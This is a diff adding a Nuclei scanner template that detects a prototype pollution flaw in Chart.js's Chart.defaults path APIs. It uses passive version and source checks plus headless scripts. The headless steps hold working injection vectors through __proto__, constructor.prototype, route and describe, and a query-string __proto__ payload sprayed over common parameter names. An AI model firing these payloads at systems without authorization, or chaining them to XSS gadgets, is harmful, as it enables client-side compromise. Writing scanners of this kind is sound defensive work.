@@ -1,0 +1,237 @@
+id: chartjs-defaults-prototype-pollution
+
+info:
+  name: Chart.js Chart.defaults Path-API Prototype Pollution (getScope)
+  author: secfathy
+  severity: high
+  description: |
+    Chart.js exposes path-based configuration APIs — Chart.defaults.set(), get(), describe(),
+    override() and route() — that all funnel the scope/key string into the internal getScope() helper
+    in src/core/core.defaults.js. getScope() splits the scope on "." and walks/creates each segment
+    with `node[k] || (node[k] = Object.create(null))` without rejecting __proto__, constructor,
+    prototype or inherited property names (toString, hasOwnProperty, set, describe...). When an
+    application forwards attacker-influenced data into any of these APIs, Object.prototype can be
+    polluted, corrupting rendering defaults, application logic, type coercion, fetch headers, or — with
+    a sink gadget (e.g. innerHTML templating) — leading to XSS.
+
+    Affected range: Chart.js 3.0.0 through the latest released 4.6.2. The describe/route/getScope path
+    APIs were introduced in 3.0.0; the fix (PR #12268) was merged 2026-11-26 but is NOT yet in any
+    tagged release, so every current release is affected. This is distinct from the legacy 2.x
+    helpers.merge issue (CVE-2020-7746).
+
+    This single template bundles four detection scenarios:
+      * http  req #1 - version fingerprint from the served bundle banner (3.0.0 <= v <= 4.6.2)
+      * http  req #2 - vulnerable getScope() source signature with patch markers absent
+      * headless #1  - behavioral proof: exercises all 4 attack vectors and checks Object.prototype
+      * headless #2  - URL-parameter sink: app that forwards request input into Chart.defaults.set()
+
+    The http requests are passive and safe to run anywhere. The headless requests require
+    `nuclei -headless`; their payloads plant only locally-scoped marker keys (__nuclei_pp_*) that do
+    not persist beyond the page session.
+  reference:
+    - https://blog.secfathy.com/posts/chartjs-prototype-pollution
+    - https://github.com/chartjs/Chart.js/pull/12268
+    - https://github.com/chartjs/Chart.js/issues/12265
+  classification:
+    cwe-id: CWE-1321
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+    cvss-score: 7.3
+  metadata:
+    max-request: 18
+    vuln-type: prototype-pollution
+    verified: true
+  tags: prototype-pollution,chartjs,client-side,js,pp,cwe-1321,getscope,headless
+
+# ---------------------------------------------------------------------------
+# Scenario A + B : passive HTTP detection (version banner + source signature)
+# ---------------------------------------------------------------------------
+http:
+  # --- Scenario A: version fingerprint -------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/chart.js"
+      - "{{BaseURL}}/chart.min.js"
+      - "{{BaseURL}}/chart.umd.js"
+      - "{{BaseURL}}/js/chart.js"
+      - "{{BaseURL}}/js/chart.min.js"
+      - "{{BaseURL}}/js/chart.umd.js"
+      - "{{BaseURL}}/assets/chart.min.js"
+      - "{{BaseURL}}/assets/js/chart.min.js"
+      - "{{BaseURL}}/static/js/chart.min.js"
+      - "{{BaseURL}}/dist/chart.umd.js"
+      - "{{BaseURL}}/node_modules/chart.js/dist/chart.umd.js"
+      - "{{BaseURL}}/vendor/chart.js/dist/chart.umd.js"
+
+    stop-at-first-match: true
+    host-redirects: true
+    max-redirects: 2
+
+    extractors:
+      - type: regex
+        name: version
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "Chart\\.js v([0-9]+\\.[0-9]+\\.[0-9]+)"
+      - type: regex
+        name: chartjs_version
+        part: body
+        group: 1
+        regex:
+          - "Chart\\.js v([0-9]+\\.[0-9]+\\.[0-9]+)"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Chart.js v"
+          - "chartjs.org"
+        condition: or
+      - type: dsl
+        name: vulnerable-version
+        dsl:
+          - "compare_versions(version, '>= 3.0.0', '<= 4.6.2')"
+
+  # --- Scenario B: unpatched getScope() source signature -------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/chart.js"
+      - "{{BaseURL}}/chart.umd.js"
+      - "{{BaseURL}}/js/chart.js"
+      - "{{BaseURL}}/js/chart.umd.js"
+      - "{{BaseURL}}/dist/chart.umd.js"
+      - "{{BaseURL}}/node_modules/chart.js/dist/chart.umd.js"
+
+    stop-at-first-match: true
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        name: getscope-signature
+        part: body
+        words:
+          - "getScope"
+          - "Object.create(null)"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "defaults"
+          - "route"
+          - "describe"
+        condition: and
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "Invalid defaults scope"
+          - "prototype pollution"
+          - "__proto__ is not"
+        condition: or
+
+# ---------------------------------------------------------------------------
+# Scenario C + D : active headless confirmation (run with: nuclei -headless)
+# ---------------------------------------------------------------------------
+headless:
+  # --- Scenario C: behavioral proof against the live DOM -------------------
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+      - action: waitload
+      - action: script
+        name: pp
+        args:
+          code: |
+            (() => {
+              try {
+                if (typeof Chart === 'undefined' || !Chart.defaults) return 'NO_CHARTJS';
+                var d = Chart.defaults, hits = [];
+
+                // Vector 1: direct __proto__
+                try { if (typeof d.set === 'function') {
+                  d.set('__proto__', { __nuclei_pp_v1: 'VULN' });
+                  if (({}).__nuclei_pp_v1 === 'VULN') hits.push('V1:set(__proto__)');
+                }} catch(e){}
+
+                // Vector 2: constructor.prototype
+                try { if (typeof d.set === 'function') {
+                  d.set('constructor.prototype', { __nuclei_pp_v2: 'VULN' });
+                  if (({}).__nuclei_pp_v2 === 'VULN') hits.push('V2:set(constructor.prototype)');
+                }} catch(e){}
+
+                // Vector 3: route API
+                try { if (typeof d.route === 'function') {
+                  d.route('__proto__', '__nuclei_pp_v3', '', 'color');
+                  if (Object.prototype.hasOwnProperty('__nuclei_pp_v3')) hits.push('V3:route(__proto__)');
+                }} catch(e){}
+
+                // Vector 4: inherited-property traversal
+                try { if (typeof d.describe === 'function') {
+                  d.describe('toString.__nuclei_pp_v4', { x: 'VULN' });
+                  if (({}).toString && ({}).toString.__nuclei_pp_v4) hits.push('V4:describe(toString.x)');
+                }} catch(e){}
+
+                return hits.length ? 'CHARTJS_PP_CONFIRMED ' + hits.join(',') : 'CHARTJS_NOT_VULNERABLE';
+              } catch (e) { return 'ERR:' + e.message; }
+            })()
+    matchers:
+      - type: word
+        part: pp
+        words:
+          - "CHARTJS_PP_CONFIRMED"
+    extractors:
+      - type: regex
+        part: pp
+        group: 1
+        regex:
+          - "CHARTJS_PP_CONFIRMED (.+)"
+
+  # --- Scenario D: application URL-parameter sink --------------------------
+  # App reads a scope + JSON config from the query string and passes both into
+  # Chart.defaults.set(scope, config). Cluster-bombs common parameter names.
+  - payloads:
+      scopeparam:
+        - "chartScope"
+        - "scope"
+        - "chartPath"
+        - "defaultsScope"
+        - "path"
+      configparam:
+        - "chartConfig"
+        - "config"
+        - "defaults"
+        - "chartDefaults"
+    attack: clusterbomb
+    steps:
+      - action: navigate
+        args:
+          # chartConfig = {"__nuclei_url_pp":"VULN"}  (URL-encoded)
+          url: "{{BaseURL}}?{{scopeparam}}=__proto__&{{configparam}}=%7B%22__nuclei_url_pp%22%3A%22VULN%22%7D"
+      - action: waitload
+      - action: script
+        name: pp
+        args:
+          code: |
+            (() => {
+              try {
+                return ({}).__nuclei_url_pp === 'VULN'
+                  ? 'URL_PP_CONFIRMED scope={{scopeparam}} config={{configparam}}'
+                  : 'clean';
+              } catch (e) { return 'ERR:' + e.message; }
+            })()
+    matchers:
+      - type: word
+        part: pp
+        words:
+          - "URL_PP_CONFIRMED"
+    extractors:
+      - type: regex
+        part: pp
+        group: 1
+        regex:
+          - "(URL_PP_CONFIRMED scope=.+ config=.+)"
